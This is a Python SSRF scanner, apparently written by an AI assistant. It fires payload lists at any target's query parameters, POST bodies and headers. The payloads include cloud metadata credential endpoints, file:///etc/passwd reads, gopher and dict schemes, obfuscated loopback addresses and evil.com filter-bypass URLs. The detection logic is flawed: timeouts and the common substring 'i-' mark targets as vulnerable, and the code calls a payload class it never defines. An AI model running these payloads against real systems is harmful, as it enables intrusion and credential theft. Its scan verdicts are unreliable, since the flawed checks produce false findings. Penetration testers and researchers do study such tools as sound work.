#!/usr/bin/env python3
"""
🔥 Advanced SSRF Vulnerability Scanner
A comprehensive tool for detecting Server-Side Request Forgery vulnerabilities

Features:
- Multiple injection points (GET/POST parameters, headers)
- Protocol fuzzing and filter evasion
- Out-of-band detection support
- Multithreading for performance
- Detailed reporting

Author: AI Security Assistant
"""

import requests
import urllib.parse as urlparse
from urllib.parse import urlencode, parse_qs
import threading
import time
import json
import argparse
import sys
import re
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Tuple, Optional
import warnings
from payloads import SSRFPayloadDatabase
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class SSRFPayloads:
    """Collection of SSRF payloads for different scenarios"""
    
    # Basic internal targets
    BASIC_INTERNAL = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
    ]
    
    # Protocol variations
    PROTOCOL_VARIATIONS = [
        "ftp://127.0.0.1",
        "gopher://127.0.0.1",
        "dict://127.0.0.1:11211",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/version",
        "file:///windows/system32/drivers/etc/hosts",
    ]
    
    # IP obfuscation techniques
    IP_OBFUSCATION = [
        "http://2130706433",  # Decimal representation of 127.0.0.1
        "http://0x7f000001",  # Hex representation
        "http://017700000001",  # Octal representation
        "http://127.1",  # Short form
        "http://127.0.1",  # Another short form
        "http://0177.0.0.1",  # Mixed octal
        "http://[0:0:0:0:0:ffff:127.0.0.1]",  # IPv6 mapped IPv4
    ]
    
    # Filter bypass techniques
    BYPASS_TECHNIQUES = [
        "http://127.0.0.1@evil.com",
        "http://evil.com#127.0.0.1",
        "http://127.0.0.1.evil.com",
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://127.0.0.1/../../etc/passwd",
        "http://127.0.0.1%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "http://127。0。0。1",  # Unicode dots
        "http://①②⑦.⓪.⓪.①",  # Unicode numbers
    ]
    
    @classmethod
    def get_all_payloads(cls, collaborator_url: Optional[str] = None) -> List[str]:
        """Get all payloads combined"""
        payloads = []
        payloads.extend(cls.BASIC_INTERNAL)
        payloads.extend(cls.PROTOCOL_VARIATIONS)
        payloads.extend(cls.IP_OBFUSCATION)
        payloads.extend(cls.BYPASS_TECHNIQUES)
        
        if collaborator_url:
            payloads.extend([
                f"http://{collaborator_url}",
                f"https://{collaborator_url}",
                f"ftp://{collaborator_url}",
                f"gopher://{collaborator_url}",
            ])
        
        return payloads

class SSRFResult:
    """Container for SSRF test results"""
    
    def __init__(self, url: str, payload: str, method: str, injection_point: str):
        self.url = url
        self.payload = payload
        self.method = method
        self.injection_point = injection_point
        self.status_code = None
        self.response_time = None
        self.response_length = None
        self.error = None
        self.vulnerable = False
        self.evidence = []
        self.timestamp = time.time()
    
    def to_dict(self) -> Dict:
        """Convert result to dictionary for JSON export"""
        return {
            'url': self.url,
            'payload': self.payload,
            'method': self.method,
            'injection_point': self.injection_point,
            'status_code': self.status_code,
            'response_time': self.response_time,
            'response_length': self.response_length,
            'error': self.error,
            'vulnerable': self.vulnerable,
            'evidence': self.evidence,
            'timestamp': self.timestamp
        }

class SSRFScanner:
    """Main SSRF vulnerability scanner class"""
    
    def __init__(self, target_url: str, collaborator_url: Optional[str] = None, 
                 threads: int = 10, timeout: int = 10, proxy: Optional[str] = None):
        self.target_url = target_url
        self.collaborator_url = collaborator_url
        self.threads = threads
        self.timeout = timeout
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.results: List[SSRFResult] = []
        self.session = requests.Session()
        self.session.verify = False
        
        # Common headers for testing
        self.test_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'X-Client-IP',
            'Referer',
            'X-Original-URL',
            'X-Rewrite-URL',
            'Host',
            'CF-Connecting-IP',
            'True-Client-IP'
        ]
    
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.RED}🔥 Advanced SSRF Vulnerability Scanner{Colors.END}
{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}
{Colors.YELLOW}Target:{Colors.END} {self.target_url}
{Colors.YELLOW}Collaborator:{Colors.END} {self.collaborator_url or 'None'}
{Colors.YELLOW}Threads:{Colors.END} {self.threads}
{Colors.YELLOW}Timeout:{Colors.END} {self.timeout}s
{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}
        """
        print(banner)
    
    def parse_url_parameters(self, url: str) -> Dict[str, List[str]]:
        """Extract GET parameters from URL"""
        parsed = urlparse.urlparse(url)
        return parse_qs(parsed.query)
    
    def test_get_parameters(self) -> List[SSRFResult]:
        """Test SSRF in GET parameters"""
        results = []
        parsed = urlparse.urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            return results
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        payloads = SSRFPayloadDatabase.get_all_payloads(self.collaborator_url)
        
        print(f"{Colors.BLUE}[*] Testing GET parameters: {list(params.keys())}{Colors.END}")
        
        for param_name in params.keys():
            for payload in payloads:
                # Create modified parameters
                modified_params = params.copy()
                modified_params[param_name] = [payload]
                
                test_url = f"{base_url}?{urlencode(modified_params, doseq=True)}"
                result = self._make_request(test_url, payload, 'GET', f'GET:{param_name}')
                results.append(result)
        
        return results
    
    def test_post_parameters(self, post_data: Optional[str] = None) -> List[SSRFResult]:
        """Test SSRF in POST parameters"""
        results = []
        
        if not post_data:
            # Try common POST data formats
            test_data_formats = [
                "url=test&callback=test",
                "redirect=test&next=test",
                "api=test&webhook=test",
                '{"url": "test", "callback": "test"}',
            ]
        else:
            test_data_formats = [post_data]
        
        payloads = SSRFPayloadDatabase.get_all_payloads(self.collaborator_url)
        
        print(f"{Colors.BLUE}[*] Testing POST parameters{Colors.END}")
        
        for data_format in test_data_formats:
            try:
                if data_format.startswith('{'):
                    # JSON format
                    data = json.loads(data_format)
                    for key in data.keys():
                        for payload in payloads:
                            modified_data = data.copy()
                            modified_data[key] = payload
                            result = self._make_request(
                                self.target_url, payload, 'POST', f'POST-JSON:{key}',
                                json_data=modified_data
                            )
                            results.append(result)
                else:
                    # Form data
                    params = parse_qs(data_format)
                    for param_name in params.keys():
                        for payload in payloads:
                            modified_params = params.copy()
                            modified_params[param_name] = [payload]
                            result = self._make_request(
                                self.target_url, payload, 'POST', f'POST-FORM:{param_name}',
                                form_data=modified_params
                            )
                            results.append(result)
            except Exception as e:
                print(f"{Colors.RED}[!] Error testing POST data format: {e}{Colors.END}")
        
        return results
    
    def test_headers(self) -> List[SSRFResult]:
        """Test SSRF in HTTP headers"""
        results = []
        payloads = SSRFPayloadDatabase.get_all_payloads(self.collaborator_url)
        
        print(f"{Colors.BLUE}[*] Testing HTTP headers: {self.test_headers}{Colors.END}")
        
        for header_name in self.test_headers:
            for payload in payloads:
                result = self._make_request(
                    self.target_url, payload, 'GET', f'HEADER:{header_name}',
                    extra_headers={header_name: payload}
                )
                results.append(result)
        
        return results
    
    def _make_request(self, url: str, payload: str, method: str, injection_point: str,
                     json_data: Optional[Dict] = None, form_data: Optional[Dict] = None,
                     extra_headers: Optional[Dict] = None) -> SSRFResult:
        """Make HTTP request and analyze response"""
        result = SSRFResult(url, payload, method, injection_point)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close'
        }
        
        if extra_headers:
            headers.update(extra_headers)
        
        try:
            start_time = time.time()
            
            if method == 'POST':
                if json_data:
                    headers['Content-Type'] = 'application/json'
                    response = self.session.post(
                        url, json=json_data, headers=headers,
                        timeout=self.timeout, proxies=self.proxy
                    )
                elif form_data:
                    response = self.session.post(
                        url, data=urlencode(form_data, doseq=True), headers=headers,
                        timeout=self.timeout, proxies=self.proxy
                    )
                else:
                    response = self.session.post(
                        url, headers=headers, timeout=self.timeout, proxies=self.proxy
                    )
            else:
                response = self.session.get(
                    url, headers=headers, timeout=self.timeout, proxies=self.proxy
                )
            
            result.response_time = time.time() - start_time
            result.status_code = response.status_code
            result.response_length = len(response.content)
            
            # Analyze response for SSRF indicators
            self._analyze_response(result, response)
            
        except requests.exceptions.Timeout:
            result.error = "Timeout"
            result.evidence.append("Request timeout (possible SSRF)")
        except requests.exceptions.ConnectionError:
            result.error = "Connection Error"
            result.evidence.append("Connection error (possible internal request)")
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def _analyze_response(self, result: SSRFResult, response: requests.Response):
        """Analyze HTTP response for SSRF indicators"""
        response_text = response.text.lower()
        
        # Check for internal service responses
        internal_indicators = [
            'connection refused',
            'no route to host',
            'network is unreachable',
            'timeout',
            'internal server error',
            'metadata',
            'instance-id',
            'ami-id',
            'security-groups',
            'iam/security-credentials',
            'root:x:0:0:root',  # /etc/passwd content
            'localhost',
            '127.0.0.1',
            'private key',
            'ssh-rsa',
            'private-key'
        ]
        
        for indicator in internal_indicators:
            if indicator in response_text:
                result.vulnerable = True
                result.evidence.append(f"Response contains: {indicator}")
        
        # Check for unusual status codes
        if result.status_code in [500, 502, 503, 504]:
            result.evidence.append(f"Unusual status code: {result.status_code}")
        
        # Check for response time anomalies
        if result.response_time > 5:
            result.evidence.append(f"Long response time: {result.response_time:.2f}s")
        
        # Check for AWS metadata responses
        if any(aws_term in response_text for aws_term in ['ami-', 'i-', 'sg-', 'vpc-']):
            result.vulnerable = True
            result.evidence.append("AWS metadata detected")
        
        # Mark as potentially vulnerable if we have evidence
        if result.evidence:
            result.vulnerable = True
    
    def run_scan(self, post_data: Optional[str] = None) -> List[SSRFResult]:
        """Run comprehensive SSRF scan"""
        self.print_banner()
        
        all_results = []
        
        # Test GET parameters
        get_results = self.test_get_parameters()
        all_results.extend(get_results)
        
        # Test POST parameters
        post_results = self.test_post_parameters(post_data)
        all_results.extend(post_results)
        
        # Test headers
        header_results = self.test_headers()
        all_results.extend(header_results)
        
        self.results = all_results
        return all_results
    
    def run_threaded_scan(self, post_data: Optional[str] = None) -> List[SSRFResult]:
        """Run scan with threading for better performance"""
        self.print_banner()
        
        # Prepare all test cases
        test_cases = []
        
        # GET parameter tests
        parsed = urlparse.urlparse(self.target_url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        payloads = SSRFPayloadDatabase.get_all_payloads(self.collaborator_url)
        
        for param_name in params.keys():
            for payload in payloads:
                modified_params = params.copy()
                modified_params[param_name] = [payload]
                test_url = f"{base_url}?{urlencode(modified_params, doseq=True)}"
                test_cases.append((test_url, payload, 'GET', f'GET:{param_name}', None, None, None))
        
        # Header tests
        for header_name in self.test_headers:
            for payload in payloads:
                test_cases.append((
                    self.target_url, payload, 'GET', f'HEADER:{header_name}',
                    None, None, {header_name: payload}
                ))
        
        print(f"{Colors.BLUE}[*] Running {len(test_cases)} tests with {self.threads} threads{Colors.END}")
        
        # Execute tests in parallel
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self._make_request, *test_case)
                for test_case in test_cases
            ]
            
            results = []
            for i, future in enumerate(futures):
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Print progress
                    if (i + 1) % 50 == 0:
                        print(f"{Colors.CYAN}[*] Completed {i + 1}/{len(test_cases)} tests{Colors.END}")
                        
                except Exception as e:
                    print(f"{Colors.RED}[!] Test failed: {e}{Colors.END}")
        
        self.results = results
        return results
    
    def print_results(self):
        """Print scan results to console"""
        vulnerable_results = [r for r in self.results if r.vulnerable]
        
        print(f"\n{Colors.BOLD}🎯 SCAN RESULTS{Colors.END}")
        print(f"{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}")
        print(f"{Colors.YELLOW}Total tests:{Colors.END} {len(self.results)}")
        print(f"{Colors.RED}Potentially vulnerable:{Colors.END} {len(vulnerable_results)}")
        
        if vulnerable_results:
            print(f"\n{Colors.RED}🚨 POTENTIAL SSRF VULNERABILITIES:{Colors.END}")
            for result in vulnerable_results:
                print(f"\n{Colors.BOLD}[VULN]{Colors.END} {result.injection_point}")
                print(f"  {Colors.YELLOW}URL:{Colors.END} {result.url}")
                print(f"  {Colors.YELLOW}Payload:{Colors.END} {result.payload}")
                print(f"  {Colors.YELLOW}Status:{Colors.END} {result.status_code}")
                print(f"  {Colors.YELLOW}Evidence:{Colors.END}")
                for evidence in result.evidence:
                    print(f"    • {evidence}")
        else:
            print(f"\n{Colors.GREEN}✅ No obvious SSRF vulnerabilities detected{Colors.END}")
        
        print(f"\n{Colors.CYAN}💡 Recommendations:{Colors.END}")
        print("• Check external monitoring for out-of-band requests")
        print("• Review application logs for internal requests")
        print("• Test with a live collaborator service")
        print("• Manually verify any flagged issues")
    
    def export_results(self, filename: str, format: str = 'json'):
        """Export results to file"""
        if format.lower() == 'json':
            with open(filename, 'w') as f:
                json.dump([r.to_dict() for r in self.results], f, indent=2)
        elif format.lower() == 'html':
            self._export_html(filename)
        
        print(f"{Colors.GREEN}[+] Results exported to {filename}{Colors.END}")
    
    def _export_html(self, filename: str):
        """Export results as HTML report"""
        vulnerable_results = [r for r in self.results if r.vulnerable]
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
        .vuln {{ background: #ffe6e6; padding: 15px; margin: 10px 0; border-left: 5px solid #ff0000; }}
        .safe {{ color: #008000; }}
        .evidence {{ margin-left: 20px; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 SSRF Vulnerability Scan Report</h1>
        <p><strong>Target:</strong> {self.target_url}</p>
        <p><strong>Scan Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>Total Tests:</strong> {len(self.results)}</p>
        <p><strong>Potential Vulnerabilities:</strong> {len(vulnerable_results)}</p>
    </div>
    
    {'<div class="safe"><h2>✅ No SSRF vulnerabilities detected</h2></div>' if not vulnerable_results else ''}
    
    {f'<h2>🚨 Potential SSRF Vulnerabilities ({len(vulnerable_results)})</h2>' if vulnerable_results else ''}
    
    {''.join([f'''
    <div class="vuln">
        <h3>{result.injection_point}</h3>
        <p><strong>URL:</strong> {result.url}</p>
        <p><strong>Payload:</strong> <code>{result.payload}</code></p>
        <p><strong>Status Code:</strong> {result.status_code}</p>
        <p><strong>Response Time:</strong> {result.response_time:.2f}s</p>
        <div class="evidence">
            <strong>Evidence:</strong>
            <ul>
                {''.join([f'<li>{evidence}</li>' for evidence in result.evidence])}
            </ul>
        </div>
    </div>
    ''' for result in vulnerable_results])}
    
    <h2>📊 All Test Results</h2>
    <table>
        <tr>
            <th>Injection Point</th>
            <th>Payload</th>
            <th>Status</th>
            <th>Response Time</th>
            <th>Vulnerable</th>
        </tr>
        {''.join([f'''
        <tr style="background-color: {'#ffe6e6' if result.vulnerable else '#f9f9f9'}">
            <td>{result.injection_point}</td>
            <td><code>{result.payload[:50]}{'...' if len(result.payload) > 50 else ''}</code></td>
            <td>{result.status_code or result.error or 'N/A'}</td>
            <td>{f'{result.response_time:.2f}s' if result.response_time else 'N/A'}</td>
            <td>{'❌ Yes' if result.vulnerable else '✅ No'}</td>
        </tr>
        ''' for result in self.results])}
    </table>
    
    <div class="header">
        <h3>💡 Recommendations</h3>
        <ul>
            <li>Monitor external services for out-of-band requests</li>
            <li>Review application logs for suspicious internal requests</li>
            <li>Use a live collaborator service for better detection</li>
            <li>Manually verify any flagged vulnerabilities</li>
            <li>Implement proper input validation and URL filtering</li>
        </ul>
    </div>
</body>
</html>
        """
        
        with open(filename, 'w') as f:
            f.write(html)

def main():
    parser = argparse.ArgumentParser(
        description="🔥 Advanced SSRF Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ssrf_scanner.py -u "http://target.com/page?url=test"
  python ssrf_scanner.py -u "http://target.com/api" -d "url=test&callback=test"
  python ssrf_scanner.py -u "http://target.com" -c "your-collab.burpcollaborator.net"
  python ssrf_scanner.py -u "http://target.com" -t 20 --proxy "http://127.0.0.1:8080"
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='Target URL to scan')
    parser.add_argument('-c', '--collaborator',
                       help='Collaborator URL for out-of-band detection')
    parser.add_argument('-d', '--data',
                       help='POST data to test (form or JSON format)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('--proxy',
                       help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-o', '--output',
                       help='Output file for results')
    parser.add_argument('--format', choices=['json', 'html'], default='json',
                       help='Output format (default: json)')
    parser.add_argument('--no-threading', action='store_true',
                       help='Disable multithreading')
    
    args = parser.parse_args()
    
    try:
        scanner = SSRFScanner(
            target_url=args.url,
            collaborator_url=args.collaborator,
            threads=args.threads,
            timeout=args.timeout,
            proxy=args.proxy
        )
        
        # Run scan
        if args.no_threading:
            results = scanner.run_scan(args.data)
        else:
            results = scanner.run_threaded_scan(args.data)
        
        # Print results
        scanner.print_results()
        
        # Export if requested
        if args.output:
            scanner.export_results(args.output, args.format)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()